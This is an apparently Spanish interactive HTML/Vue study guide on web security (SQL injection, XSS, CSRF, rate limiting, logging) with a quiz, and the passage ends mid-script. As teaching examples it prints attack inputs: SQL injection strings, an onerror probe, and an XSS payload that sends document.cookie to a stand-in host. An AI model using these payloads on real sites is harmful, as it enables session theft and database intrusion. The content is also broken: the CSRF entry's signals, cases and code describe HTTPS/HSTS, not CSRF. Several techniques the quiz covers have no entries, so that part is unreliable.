<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Seguridad en desarrollo — Guía Interactiva</title>
<script src="https://unpkg.com/vue@3/dist/vue.global.prod.js"></script>
<style>
  :root {
    --bg: #120f14;
    --bg2: #19151c;
    --bg3: #221d28;
    --border: #2e2734;
    --text: #efe6ec;
    --muted: #a898b0;
    --accent: #f87171;
    --accent2: #fca5a5;
    --green: #34d399;
    --red: #f87171;
    --amber: #fbbf24;
    --web: #f87171;
    --auth: #fbbf24;
    --infra: #60a5fa;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { height: 100%; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
    font-size: 15px;
    line-height: 1.6;
  }
  #app { display: flex; flex-direction: column; height: 100vh; }

  /* Header */
  header {
    display: flex; align-items: center; gap: 16px;
    padding: 12px 20px; background: var(--bg2);
    border-bottom: 1px solid var(--border);
    flex-wrap: wrap;
  }
  header h1 { font-size: 18px; letter-spacing: .3px; white-space: nowrap; }
  header h1 span { color: var(--accent2); }
  header .search { flex: 1; min-width: 220px; display: flex; }
  header .search input {
    width: 100%; padding: 8px 12px; border-radius: 8px;
    border: 1px solid var(--border); background: var(--bg);
    color: var(--text); outline: none; font-size: 14px;
  }
  header .search input:focus { border-color: var(--accent); }
  nav.views { display: flex; gap: 6px; }
  nav.views button {
    padding: 8px 14px; border-radius: 8px; border: 1px solid var(--border);
    background: var(--bg); color: var(--muted); cursor: pointer; font-size: 14px;
  }
  nav.views button.active { background: var(--accent); color: #111; border-color: var(--accent); }

  /* Layout */
  main { flex: 1; display: flex; overflow: hidden; }

  /* Sidebar */
  aside {
    width: 320px; background: var(--bg2); border-right: 1px solid var(--border);
    overflow-y: auto; padding: 12px;
  }
  aside .cat { margin-bottom: 8px; }
  aside .cat-title {
    font-size: 12px; text-transform: uppercase; letter-spacing: 1px;
    color: var(--muted); padding: 8px 10px 4px; font-weight: 700;
  }
  aside button.item {
    display: flex; align-items: center; gap: 8px; width: 100%;
    padding: 8px 10px; border: 1px solid transparent; border-radius: 8px;
    background: transparent; color: var(--text); cursor: pointer;
    text-align: left; font-size: 14px; margin-bottom: 2px;
  }
  aside button.item:hover { background: var(--bg3); }
  aside button.item.active { background: var(--bg3); border-color: var(--border); }
  aside button.item .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
  aside button.item .studied { margin-left: auto; color: var(--green); font-size: 12px; }
  aside .progress {
    padding: 12px 10px; border-bottom: 1px solid var(--border); margin-bottom: 8px;
  }
  aside .progress .bar {
    height: 8px; background: var(--bg); border-radius: 4px; overflow: hidden; margin-top: 6px;
  }
  aside .progress .fill { height: 100%; background: var(--green); transition: width .3s; }

  /* Content */
  section.content { flex: 1; overflow-y: auto; padding: 24px 32px; }
  .pattern-head { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 6px; }
  .pattern-head h2 { font-size: 26px; }
  .badge {
    padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 700;
    text-transform: uppercase; letter-spacing: .5px;
  }
  .badge-web { background: rgba(248,113,113,.15); color: var(--web); }
  .badge-auth { background: rgba(251,191,36,.15); color: var(--auth); }
  .badge-infra { background: rgba(96,165,250,.15); color: var(--infra); }
  .concepto { color: var(--muted); font-size: 16px; margin-bottom: 20px; font-style: italic; }

  .card {
    background: var(--bg2); border: 1px solid var(--border);
    border-radius: 12px; padding: 18px 20px; margin-bottom: 16px;
  }
  .card h3 {
    font-size: 14px; text-transform: uppercase; letter-spacing: 1px;
    margin-bottom: 10px; color: var(--accent2);
  }
  .card h3.none { color: var(--red); }
  .card p, .card li { color: var(--text); }
  .card ul { padding-left: 18px; }
  .card li { margin-bottom: 6px; }

  .senal-row {
    display: flex; align-items: flex-start; gap: 10px; padding: 8px 10px;
    border-radius: 8px; cursor: pointer; margin-bottom: 4px;
    border: 1px solid transparent; user-select: none;
  }
  .senal-row:hover { background: var(--bg3); }
  .senal-row.on { background: rgba(52,211,153,.08); border-color: rgba(52,211,153,.4); }
  .senal-row input { margin-top: 4px; accent-color: var(--green); cursor: pointer; }
  .meter { margin-top: 12px; }
  .meter .lbl { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 4px; color: var(--muted); }
  .meter .bar { height: 10px; background: var(--bg); border-radius: 5px; overflow: hidden; }
  .meter .fill { height: 100%; transition: width .3s, background .3s; border-radius: 5px; }

  pre {
    background: var(--bg); border: 1px solid var(--border); border-radius: 10px;
    padding: 14px 16px; overflow-x: auto; font-size: 13.5px; line-height: 1.5;
    font-family: "Cascadia Code", Consolas, monospace; color: #f5c8c8;
  }
  .lbl-count { font-size: 12px; color: var(--muted); margin-top: 6px; }

  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
  @media (max-width: 900px) { .grid2 { grid-template-columns: 1fr; } }

  .empty { color: var(--muted); text-align: center; padding: 40px; font-size: 16px; }

  /* Diagnostic */
  .diag-intro { color: var(--muted); margin-bottom: 16px; }
  .diag-symp {
    display: flex; align-items: flex-start; gap: 10px; padding: 8px 10px;
    border-radius: 8px; cursor: pointer; margin-bottom: 4px;
    border: 1px solid var(--border); background: var(--bg2); user-select: none;
  }
  .diag-symp.on { background: rgba(248,113,113,.1); border-color: var(--accent); }
  .diag-symp input { margin-top: 4px; accent-color: var(--accent); cursor: pointer; }
  .result-item {
    display: flex; align-items: center; gap: 10px; padding: 10px 12px;
    background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
    margin-bottom: 8px; cursor: pointer;
  }
  .result-item .score { margin-left: auto; font-weight: 700; color: var(--accent2); }
  .result-item .matchbar { height: 6px; background: var(--bg); border-radius: 3px; width: 60px; overflow: hidden; margin-left: 10px; }
  .result-item .matchbar .fill { height: 100%; background: var(--accent2); }

  /* Quiz */
  .quiz-q {
    background: var(--bg2); border: 1px solid var(--border);
    border-radius: 12px; padding: 18px 20px; margin-bottom: 16px;
  }
  .quiz-q .q { font-size: 16px; font-weight: 600; margin-bottom: 12px; }
  .quiz-q .patron-tag { font-size: 12px; color: var(--muted); margin-bottom: 8px; }
  .opt {
    display: block; padding: 10px 12px; margin-bottom: 8px; border-radius: 8px;
    border: 1px solid var(--border); cursor: pointer; background: var(--bg);
    transition: all .15s;
  }
  .opt:hover { border-color: var(--accent); }
  .opt.selected { border-color: var(--accent); background: rgba(248,113,113,.12); }
  .opt.correct { border-color: var(--green); background: rgba(52,211,153,.12); }
  .opt.wrong { border-color: var(--red); background: rgba(248,113,113,.12); }
  .quiz-actions { display: flex; gap: 10px; margin-bottom: 20px; align-items: center; }
  .btn {
    padding: 9px 16px; border-radius: 8px; border: 1px solid var(--border);
    background: var(--bg2); color: var(--text); cursor: pointer; font-size: 14px;
  }
  .btn.primary { background: var(--accent); color: #111; border-color: var(--accent); }
  .btn:disabled { opacity: .5; cursor: not-allowed; }
  .quiz-score { font-size: 14px; color: var(--muted); }
  .quiz-result { font-size: 18px; font-weight: 700; padding: 12px; border-radius: 10px; text-align: center; margin-top: 10px; }
  .code-block { position: relative; }
  .code-block .lang {
    position: absolute; top: 8px; right: 12px; font-size: 11px; color: var(--muted);
    text-transform: uppercase; letter-spacing: 1px;
  }
  .tabs { display: flex; gap: 6px; margin-bottom: 18px; flex-wrap: wrap; }
  .tabs button {
    padding: 7px 14px; border-radius: 8px; border: 1px solid var(--border);
    background: var(--bg2); color: var(--muted); cursor: pointer; font-size: 13px;
  }
  .tabs button.active { background: var(--accent); color: #111; border-color: var(--accent); }
  ::-webkit-scrollbar { width: 10px; height: 10px; }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
  ::-webkit-scrollbar-track { background: transparent; }
</style>
</head>
<body>
<div id="app">

  <header>
    <h1>Seguridad <span>DevSecOps</span></h1>
    <div class="search" v-if="view !== 'diagnostico'">
      <input type="text" v-model="query" placeholder="Buscar técnica, síntoma, código...">
    </div>
    <nav class="views">
      <button :class="{active: view==='estudio'}" @click="view='estudio'">Estudio</button>
      <button :class="{active: view==='diagnostico'}" @click="view='diagnostico'">Diagnóstico</button>
      <button :class="{active: view==='quiz'}" @click="view='quiz'">Quiz</button>
    </nav>
  </header>

  <main>
    <!-- SIDEBAR -->
    <aside v-if="view==='estudio'">
      <div class="progress">
        <div>Progreso: <b>{{ studiedCount }} / {{ techniques.length }}</b> técnicas dominadas</div>
        <div class="bar"><div class="fill" :style="{width: (studiedCount/techniques.length*100)+'%'}"></div></div>
      </div>
      <template v-for="cat in categories" :key="cat.id">
        <div class="cat">
          <div class="cat-title">{{ cat.label }}</div>
          <button v-for="t in filteredByCat(cat.id)" :key="t.id"
                  class="item" :class="{active: current.id===t.id}"
                  @click="selectTechnique(t)">
            <span class="dot" :style="{background: catColor(cat.id)}"></span>
            <span>{{ t.name }}</span>
            <span v-if="studied.includes(t.id)" class="studied">listo</span>
          </button>
        </div>
      </template>
    </aside>

    <!-- CONTENT -->
    <section class="content">

      <!-- ====== ESTUDIO ====== -->
      <template v-if="view==='estudio'">
        <div v-if="current">
          <div class="pattern-head">
            <h2>{{ current.name }}</h2>
            <span class="badge" :class="'badge-'+current.categoria">{{ catLabel(current.categoria) }}</span>
            <button class="btn" :class="{primary: studied.includes(current.id)}"
                    @click="toggleStudied(current.id)">
              {{ studied.includes(current.id) ? 'Marcada como dominada' : 'Marcar como dominada' }}
            </button>
          </div>
          <p class="concepto">«{{ current.concepto }}»</p>

          <div class="tabs">
            <button v-for="t in tabs" :key="t.id" :class="{active: tab===t.id}" @click="tab=t.id">{{ t.label }}</button>
          </div>

          <template v-if="tab==='guiarapida'">
            <div class="card">
              <h3>Problema que resuelve</h3>
              <p>{{ current.problema }}</p>
            </div>
            <div class="grid2">
              <div class="card">
                <h3>Señales de que lo necesitas</h3>
                <ul>
                  <li v-for="s in current.senales" :key="s">{{ s }}</li>
                </ul>
              </div>
              <div class="card">
                <h3>Cuándo NO usarlo</h3>
                <ul>
                  <li v-for="n in current.noUsar" :key="n">{{ n }}</li>
                </ul>
              </div>
            </div>
            <div class="card">
              <h3>Alternativas a considerar</h3>
              <ul>
                <li v-for="a in current.alternativas" :key="a">{{ a }}</li>
              </ul>
            </div>
            <div class="card">
              <h3>Anti-patrón / olor de código que corrige</h3>
              <p>{{ current.antipatron }}</p>
            </div>
          </template>

          <template v-if="tab==='casos'">
            <div class="card">
              <h3>Casos de uso reales</h3>
              <ul>
                <li v-for="c in current.casos" :key="c">{{ c }}</li>
              </ul>
            </div>
            <div class="card">
              <h3>Análisis: ¿cómo reconocerlo en la práctica?</h3>
              <p>{{ current.analisis }}</p>
            </div>
          </template>

          <template v-if="tab==='autodiagnostico'">
            <div class="card">
              <h3>¿Se aplica a tu código? Marca las señales que veas</h3>
              <div v-for="s in current.senales" :key="s" class="senal-row" :class="{on: estado[current.id] && estado[current.id][s]}" @click="toggleSenal(s)">
                <input type="checkbox" :checked="estado[current.id] && estado[current.id][s]" @click.stop>
                <span>{{ s }}</span>
              </div>
              <div class="meter">
                <div class="lbl"><span>Coincidencia</span><span>{{ senalPct }}%</span></div>
                <div class="bar"><div class="fill" :style="{width: senalPct+'%', background: senalColor}"></div></div>
              </div>
              <div class="lbl-count" v-if="senalPct >= 50">
                Alta coincidencia con esta técnica. Revisa los casos de uso y el ejemplo antes/después para confirmarlo.
              </div>
              <div class="lbl-count" v-else-if="senalPct > 0">
                Baja coincidencia. Verifica los casos de uso o explora otras técnicas en el Diagnóstico.
              </div>
              <div class="lbl-count" v-else>
                Sin señales marcadas todavía.
              </div>
            </div>
          </template>

          <template v-if="tab==='ejemplo'">
            <div class="card">
              <h3>Ejemplo antes / después</h3>
              <div class="code-block">
                <span class="lang">pseudocódigo</span>
                <pre>{{ current.ejemplo }}</pre>
              </div>
              <p style="margin-top:10px; color: var(--muted);">{{ current.explicacion }}</p>
            </div>
          </template>

        </div>
        <div v-else class="empty">Sin resultados para «{{ query }}».</div>
      </template>

      <!-- ====== DIAGNÓSTICO ====== -->
      <template v-if="view==='diagnostico'">
        <h2 style="margin-bottom:6px;">Diagnóstico de seguridad</h2>
        <p class="diag-intro">
          Marca los síntomas de seguridad que estés viendo en tu código o tu infraestructura.
          La app te sugerirá las técnicas con mayor coincidencia. Añade tantas como quieras; ordena por relevancia.
        </p>
        <div v-for="s in allSymptoms" :key="s.text" class="diag-symp" :class="{on: diagSelected.includes(s.text)}" @click="toggleDiag(s.text)">
          <input type="checkbox" :checked="diagSelected.includes(s.text)" @click.stop>
          <span>{{ s.text }}</span>
        </div>
        <h3 style="margin:24px 0 12px;">Técnicas sugeridas ({{ sortedResults.length }})</h3>
        <div v-if="sortedResults.length" class="result-item" v-for="r in sortedResults" :key="r.t.id" @click="openTechnique(r.t)">
          <span class="dot" :style="{background: catColor(r.t.categoria)}"></span>
          <span>{{ r.t.name }}</span>
          <span class="matchbar"><span class="fill" :style="{width: (r.score/maxScore*100)+'%'}"></span></span>
          <span class="score">{{ r.score }}</span>
        </div>
        <div v-else class="empty">Marca algún síntoma de seguridad para obtener recomendaciones.</div>
      </template>

      <!-- ====== QUIZ ====== -->
      <template v-if="view==='quiz'">
        <div class="quiz-actions">
          <button class="btn" :disabled="submitted" @click="submitQuiz">Corregir</button>
          <button class="btn" @click="resetQuiz">Reiniciar</button>
          <span class="quiz-score" v-if="submitted">Puntaje: {{ score }}/{{ quiz.length }}</span>
          <span class="quiz-score" v-else>Respondidas: {{ answeredCount }}/{{ quiz.length }}</span>
        </div>
        <div class="quiz-q" v-for="(q, i) in quiz" :key="q.id">
          <div class="patron-tag">{{ q.tema }} — Pregunta {{ i+1 }}</div>
          <div class="q">{{ q.question }}</div>
          <div v-for="o in q.options" :key="o" class="opt"
               :class="{
                 selected: answers[q.id]===o,
                 correct: submitted && o===q.answer,
                 wrong: submitted && answers[q.id]===o && o!==q.answer
               }"
               @click="!submitted && (answers[q.id]=o)">
            {{ o }}
          </div>
          <div v-if="submitted" class="quiz-result" :style="{background: q.answer===answers[q.id] ? 'rgba(52,211,153,.1)' : 'rgba(248,113,113,.1)', color: q.answer===answers[q.id] ? 'var(--green)' : 'var(--red)'}">
            {{ q.answer===answers[q.id] ? 'Correcto' : 'Incorrecto — respuesta: ' + q.answer }}
          </div>
        </div>
      </template>

    </section>
  </main>
</div>

<script>
const { createApp } = Vue;

const techniques = [
  {
    id: "inyeccionsql", name: "Inyección SQL", categoria: "web",
    concepto: "Usa sentencias preparadas con parámetros bindeados para que la entrada del usuario nunca se interprete como código SQL.",
    problema: "Un atacante inyecta fragmentos de SQL en campos de texto (login, búsqueda, filtros) y consigue leer, modificar o destruir la base de datos completa.",
    senales: [
      "Construyo consultas concatenando strings con datos del usuario.",
      "El formulario de login arma la consulta con 'nombre=' + input.",
      "Una comilla simple en la entrada rompe la consulta y devuelve error 500.",
      "He probado ' OR '1'='1 y 'funciona' para saltarme la validación."
    ],
    noUsar: [
      "No intentes 'escapar' comillas manualmente: es frágil y se rompe con otro encoding.",
      "No confíes en que 'el usuario no hará eso': toda entrada es hostil.",
      "No filtres con listas negras de palabras (SELECT, DROP): se evitan con mayúsculas y encoding."
    ],
    alternativas: [
      "Sentencias preparadas / parámetros bindeados en todos los ORMs y drivers.",
      "Validar entrada (tipo, longitud, formato) antes de que llegue a la consulta.",
      "Mínimos privilegios: la cuenta de la BD no debe poder DROP TABLE."
    ],
    antipatron: "Concatenación de SQL con datos del usuario: select * from usuarios where nombre = \"' + input + '\". Una sola comilla rompe el filtro y cualquier consulta arbitraria se cuela.",
    casos: [
      "Login que comprueba contra la primera fila de la tabla usuarios.",
      "Búsqueda de productos con filtros dinámicos desde la URL.",
      "Filtros de fecha o id que terminan interpolados en el WHERE."
    ],
    analisis: "Rastrea cada string que acabe en una query: si ves el operador '+' o interpolación entre texto y una variable de usuario, es inyección SQL. La prueba definitiva: enviar  ' OR '1'='1  en un campo y ver si cambia el resultado.",
    ejemplo:
`// ANTES: concatenación vulnerable
function login(usuario, pass) {
  const sql = "SELECT * FROM usuarios WHERE nombre='" + usuario + "' AND pass='" + pass + "'";
  return db.query(sql);
  // usuario = admin' --  borra el resto del WHERE y entra sin contraseña
}

// DESPUÉS: sentencia preparada con parámetros
function login(usuario, pass) {
  return db.query(
    "SELECT * FROM usuarios WHERE nombre = ? AND pass = ?",
    [usuario, pass]   // el driver trata el valor como dato, nunca como SQL
  );
}`,
    explicacion: "Con parámetros bindeados, el valor del usuario viaja como dato y no como SQL: hasta admin'-- se busca como texto literal y la consulta devuelve cero filas."
  },
  {
    id: "xss", name: "XSS (Cross-Site Scripting)", categoria: "web",
    concepto: "Escapa la entrada del usuario en el punto de renderizado para que un script no se ejecute en el navegador de otras personas.",
    problema: "Un atacante inyecta <script> en campos que se muestran a otros usuarios (comentarios, perfil). Al cargar la página, el script roba cookies, sesiones o pulsaciones de teclado.",
    senales: [
      "Renderizo datos del usuario con innerHTML o v-html sin escapar.",
      "Un comentario muestra '<b>hola</b>' como formato en vez de texto literal.",
      "Almaceno y devuelvo el HTML tal cual lo manda el cliente.",
      "Las cookies de sesión no tienen HttpOnly y puedo leerlas con JS."
    ],
    noUsar: [
      "No confíes en escapar solo comillas: el atacante usa etiquetas enteras.",
      "No uses solo regex para 'limpiar' HTML: se rompen con variantes.",
      "No sanitices solo en el cliente: el ataque viaja por el servidor."
    ],
    alternativas: [
      "Escapado contextual al renderizar (textContent, {{ }} de Vue escapa por defecto).",
      "Sanitización en el servidor si el contenido debe admitir HTML rico.",
      "CSP (Content Security Policy) para bloquear scripts inline como segunda línea."
    ],
    antipatron: "Reflejar la entrada del usuario en el DOM sin escapar: v-html con un string que viene de la BD. El atacante entrega <script>fetch('https://malo.evil/?c=' + document.cookie)<\/script> y cualquier visitante lo ejecuta.",
    casos: [
      "Comentarios de usuarios renderizados en un listado público.",
      "Nombre de usuario mostrado en el saludo del dashboard.",
      "Término de búsqueda reflejado en la página de resultados."
    ],
    analisis: "Busca v-html, innerHTML, insertAdjacentHTML o document.write con datos que vengan de la BD o del query string: cualquiera convierte la entrada en HTML interpretable. Prueba con <img src=x onerror=alert(1)>.",
    ejemplo:
`// ANTES: el comentario se renderiza como HTML ejecutable
function renderComentario(c) {
  div.innerHTML = c.texto;
  // <script>alert('xss')<\/script> se ejecuta en el navegador de todos
}

// DESPUÉS: se inserta como texto plano
function renderComentario(c) {
  const nodo = document.createElement("p");
  nodo.textContent = c.texto; // se muestra literal, nunca se ejecuta
}`,
    explicacion: "textContent (y la interpolación {{ }} de Vue) tratan el dato como texto: las etiquetas <script> no se interpretan. Añade cookies HttpOnly para que ni un XSS pueda leerlas."
  },
  {
    id: "csrf", name: "CSRF (Cross-Site Request Forgery)", categoria: "web",
    concepto: "Protege las peticiones de cambio de estado con un token ligado a la sesión, para que una página externa no pueda actuar en nombre del usuario.",

    senales: [
      "La app responde por HTTP en producción.",
      "Hay formularios de login o tokens que viajan sin cifrar.",
      "No redirijo de http:// a https://.",
      "Las cookies no tienen el flag Secure."
    ],
    noUsar: [
      "No cifres 'solo el login': el resto de la sesión también se roba.",
      "No uses TLS viejo (SSL, TLS 1.0/1.1) ni cifrados débiles.",
      "No mezcles contenido seguro e inseguro en la misma página."
    ],
    alternativas: [
      "Certificado TLS automático (Let's Encrypt) en todos los dominios.",
      "HSTS (Strict-Transport-Security) para obligar HTTPS siempre.",
      "En el cliente, validar el certificado: nunca desactivar la verificación."
    ],
    antipatron: "Tráfico en claro: tokens de sesión viajando por HTTP en una red WiFi pública. Con un sniffer, cualquiera copia la cookie y reutiliza la sesión sin tocar tu código.",
    casos: [
      "Certificado Let's Encrypt renovado automáticamente.",
      "Header Strict-Transport-Security: max-age=31536000; includeSubDomains.",
      "Cookies de sesión con Secure para que solo viajen por HTTPS."
    ],
    analisis: "Abre la app con http:// y con https://: si http:// responde igual y el login funciona por ahí, hay tráfico en claro. Revisa también que ninguna página https cargue recursos por http.",
    ejemplo:
`// ANTES: HTTP puro, tokens en claro
// http://miapp.com/login  — la cookie SESSION=abc viaja sin cifrar
// un sniffer en el WiFi la copia y suplanta la sesión

// DESPUÉS: HTTPS obligatorio + HSTS + cookie Secure
// servidor redirige: http://  ->  https://  (301)
// Header: Strict-Transport-Security: max-age=31536000; includeSubDomains
// Set-Cookie: SESSION=abc; HttpOnly; Secure; SameSite=Strict`,
    explicacion: "HTTPS cifra cada byte entre el navegador y el servidor: el sniffer solo ve basura. HSTS impide que el navegador vuelva a intentar HTTP, y Secure evita que la cookie viaje en claro."
  },
  {
    id: "ratelimit", name: "Rate limiting", categoria: "infra",
    concepto: "Limita cuántas peticiones acepta un endpoint por usuario o IP en una ventana de tiempo, para frenar fuerza bruta, scraping y abuso.",
    problema: "Endpoints de login, registro, verificación u operaciones caras no tienen límite: un script prueba millones de contraseñas o agota el servidor.",
    senales: [
      "Puedo lanzar 10.000 peticiones al login en un minuto sin respuesta.",
      "No hay límite por IP ni por usuario en los endpoints sensibles.",
      "El endpoint de búsqueda se usa para hacer scraping a placer.",
      "Cargas pesadas (exportar, enviar email) se disparan sin control."
    ],
    noUsar: [
      "No pongas solo un límite global: el atacante reparte desde muchas IPs (usa por usuario + IP).",
      "No bloquees de forma permanente sin revisar: existe abuso legítimo (office, CI).",
      "El rate limit no sustituye al 2FA ni al hash correcto: es una capa más."
    ],
    alternativas: [
      "Limitador por usuario, IP y ruta con ventana deslizante (token bucket).",
      "Backoff y captcha en intentos repetidos de login.",
      "Colas y límites de concurrencia para endpoints caros."
    ],
    antipatron: "Login sin límite: con la lista de contraseñas más comunes (rockyou), un bot fuerza contraseñas en segundos. El sistema no avisa y la cuenta más débil cae.",
    casos: [
      "5 intentos de login por IP + usuario, luego espera exponencial.",
      "100 peticiones por minuto por usuario a la API pública.",
      "Límite a enviar emails o generar exportaciones por hora."
    ],
    analisis: "Prueba a disparar muchas peticiones a un endpoint sensible (login, reset, scraping) desde un script: si ninguna responde con 429 Too Many Requests, no hay rate limiting.",
    ejemplo:
`// ANTES: el login acepta peticiones infinitas
app.post("/login", (req, res) => {
  const ok = comprobar(req.body.user, req.body.pass); // fuerza bruta ilimitada
  res.json({ ok });
});

// DESPUÉS: limitador por IP + usuario
const limite = rateLimit({
  windowMs: 60 * 1000,          // una ventana de 1 minuto
  max: 5,                       // máximo 5 intentos
  keyGenerator: (req) => req.body.user + req.ip
});
app.post("/login", limite, (req, res) => {
  // tras 5 fallos por minuto: 429 Too Many Requests con backoff
  const ok = comprobar(req.body.user, req.body.pass);
  res.json({ ok });
});`,
    explicacion: "El limitador frena la fuerza bruta: cada intento después del límite devuelve 429 y el atacante no puede probar millones de claves. Combinado con 2FA y hash lento, la cuenta deja de ser vulnerable."
  },
  {
    id: "logseguro", name: "Logging seguro", categoria: "infra",
    concepto: "Registra eventos relevantes (logins, errores, cambios de permiso) sin datos sensibles, con rotación y acceso restringido a los logs.",
    problema: "Logs que capturan contraseñas, tokens o datos personales en claro son una fuga por la puerta trasera: todo lo que pasa por la app acaba en el archivo y en las herramientas de monitoreo.",
    senales: [
      "Logueo el objeto request completo, que incluye contraseñas y tokens.",
      "Las contraseñas o tokens aparecen en los logs de error y de debugging.",
      "Los logs no tienen niveles, ni rotación, y los ve cualquiera.",
      "No hay registro de eventos de seguridad (logins fallidos, cambios de rol)."
    ],
    noUsar: [
      "No vuelques el request entero a los logs: siempre hay un secreto dentro.",
      "No guardes logs indefinidamente sin política de retención ni cifrado.",
      "No loguees en desarrollo cosas que luego se van a producción."
    ],
    alternativas: [
      "Campos blancos: userId, acción, IP, resultado; nunca credenciales.",
      "Redactar contraseñas y tokens antes de loguear (p. ej. sustituir por '***').",
      "Rotación, retención definida, acceso restringido y monitoreo de logins fallidos."
    ],
    antipatron: "Loguear req.body entero: un error de validación imprime la contraseña del usuario en el log. Ese log termina en un bucket o un SIEM y una auditoría lo encuentra: la contraseña en claro queda archivada para siempre.",
    casos: [
      "Registrar un login fallido con userId e IP, sin la contraseña probada.",
      "Redactar tokens en los logs de la pasarela de pagos.",
      "Evento 'rol cambiado de X a Y por admin Z' en auditoría."
    ],
    analisis: "Revisa qué se loguea en los errores: si algún console.log, logger.error o el framework imprimen el objeto completo de la petición o una excepción con parámetros, hay fuga. Los secretos nunca deben tocar el archivo de log.",
    ejemplo:
`// ANTES: el request completo va al log (incluye la contraseña)
app.post("/login", (req, res) => {
  logger.info("intento login", { body: req.body }); // "pass":"clave123" en el log
  ...
});

// DESPUÉS: solo campos útiles y sin credenciales
app.post("/login", (req, res) => {
  const ok = comprobar(req.body.user, req.body.pass);
  logger.info("intento login", {
    user: req.body.user,  // nunca la contraseña ni el token
    ok: ok,
    ip: req.ip
  });
});`,
    explicacion: "El log guarda lo necesario para auditar (quién, cuándo, desde dónde, éxito o fracaso) y nunca credenciales. Si el log se filtra, la contraseña no está dentro para robar."
  }
];

const quiz = [
  { id: "q1", tema: "Web", question: "Un campo de login concatena la entrada del usuario dentro de la consulta SQL. ¿Qué vulnerabilidad es y cómo se corrige?",
    options: ["XSS — escapando la salida", "Inyección SQL — con sentencias preparadas", "CSRF — con token anti-CSRF", "Fuerza bruta — con rate limiting"], answer: "Inyección SQL — con sentencias preparadas" },
  { id: "q2", tema: "Web", question: "Los comentarios de usuarios se renderizan con innerHTML sin escapar. ¿Qué ataque ejecuta el atacante y cómo se mitiga?",
    options: ["Inyección SQL — parametrizando", "XSS — usando textContent o escapado contextual", "CSRF — con tokens", "IDOR — validando la propiedad"], answer: "XSS — usando textContent o escapado contextual" },
  { id: "q3", tema: "Web", question: "La API de transferencias solo valida la cookie de sesión y un form de otro dominio puede disparar la transferencia. ¿Qué defensa añades?",
    options: ["Token anti-CSRF + SameSite=Strict", "Rate limiting por IP", "bcrypt en la base de datos", "CSP para scripts"], answer: "Token anti-CSRF + SameSite=Strict" },
  { id: "q4", tema: "Web", question: "El backend guarda req.body.edad tal cual llega del cliente. ¿Cuál es el principio correcto?",
    options: ["Validar solo en el frontend para no molestar al usuario", "Whitelist de formato y rango en el servidor", "Bloquear palabras peligrosas con blacklist", "Confiar en los datos porque la web los genera"], answer: "Whitelist de formato y rango en el servidor" },
  { id: "q5", tema: "Autenticación", question: "En la BD, dos usuarios con la contraseña 'password' tienen el mismo hash MD5. ¿Cuál es el fallo y la corrección?",
    options: ["Falta cifrado AES con una clave compartida", "Falta salt: usar bcrypt/argon2 con salt y coste", "El hash es demasiado largo", "Falta comprimir el hash con SHA-512"], answer: "Falta salt: usar bcrypt/argon2 con salt y coste" },
  { id: "q6", tema: "Autenticación", question: "La sesión se decide con un campo 'rol' que vive en una cookie editable por el cliente. ¿Qué ocurre y cuál es la solución?",
    options: ["Es correcto: el cliente conoce su propio rol", "Cualquiera edita el rol: sesión opaca en el servidor + cookie HttpOnly", "Basta con ofuscar el valor del rol", "Firmar la cookie con MD5 para protegerla"], answer: "Cualquiera edita el rol: sesión opaca en el servidor + cookie HttpOnly" },
  { id: "q7", tema: "Autenticación", question: "El servidor usa jwt.decode() (sin verificar la firma) con un secret débil en el repo. ¿Qué riesgo real existe?",
    options: ["Ninguno: el token es solo texto", "El atacante puede fabricar tokens firmados a su gusto", "Solo afecta al rendimiento", "Los tokens expiran y se autodestruyen"], answer: "El atacante puede fabricar tokens firmados a su gusto" },
  { id: "q8", tema: "Autenticación", question: "El endpoint GET /pedido/:id devuelve cualquier pedido con solo estar logueado. ¿Qué tipo de fallo es?",
    options: ["CSRF", "IDOR / falta de autorización por recurso", "XSS almacenado", "Rate limiting insuficiente"], answer: "IDOR / falta de autorización por recurso" },
  { id: "q9", tema: "Infraestructura", question: "Subiste una API key a un repositorio público por accidente. ¿Qué acción es la correcta?",
    options: ["Borrar el archivo y seguir", "Revocar/rotar la clave y limpiar el historial de git", "Ofuscar la clave con base64", "Cambiar el repo a privado y olvidar"], answer: "Revocar/rotar la clave y limpiar el historial de git" },
  { id: "q10", tema: "Infraestructura", question: "Tu app de producción responde por HTTP y el login viaja en claro. ¿Qué configuras primero?",
    options: ["Rate limiting en el login", "HTTPS obligatorio (redirección + HSTS) y cookies Secure", "Validación de entrada en el formulario", "2FA en todas las cuentas"], answer: "HTTPS obligatorio (redirección + HSTS) y cookies Secure" }
];

createApp({
  data() {
    return {
      techniques,
      quiz,
      view: "estudio",
      query: "",
      tab: "guiarapida",
      tabs: [
        { id: "guiarapida", label: "Guía rápida" },
        { id: "casos", label: "Casos de uso" },
        { id: "autodiagnostico", label: "Autodiagnóstico" },
        { id: "ejemplo", label: "Ejemplo" }
      ],
      categories: [
        { id: "web", label: "Web" },
        { id: "auth", label: "Autenticación y autorización" },
        { id: "infra", label: "Infraestructura" }
      ],
      current: techniques[0],
      estado: JSON.parse(localStorage.getItem("seguridad_estado") || "{}"),
      studied: JSON.parse(localStorage.getItem("seguridad_studied") || "[]"),
      diagSelected: JSON.parse(localStorage.getItem("seguridad_diag") || "[]"),
      submitted: false,
      answers: {}
    };
  },
  computed: {
    studiedCount() { return this.studied.length; },
    senalPct() {
      const cur = this.estado[this.current.id] || {};
      const total = this.current.senales.length;
      const on = Object.values(cur).filter(Boolean).length;
      return Math.round(on / total * 100);
    },
    senalColor() {
      const p = this.senalPct;
      return p >= 50 ? "#34d399" : p > 0 ? "#fbbf24" : "#2e2734";
    },
    allSymptoms() {
      const seen = new Map();
      for (const t of this.techniques) {
        for (const s of t.senales) {
          if (!seen.has(s)) seen.set(s, []);
          seen.get(s).push(t.id);
        }
      }
      return Array.from(seen, ([text, tecnicas]) => ({ text, tecnicas }));
    },
    sortedResults() {
      if (!this.diagSelected.length) return [];
      const scores = {};
      for (const t of this.techniques) scores[t.id] = 0;
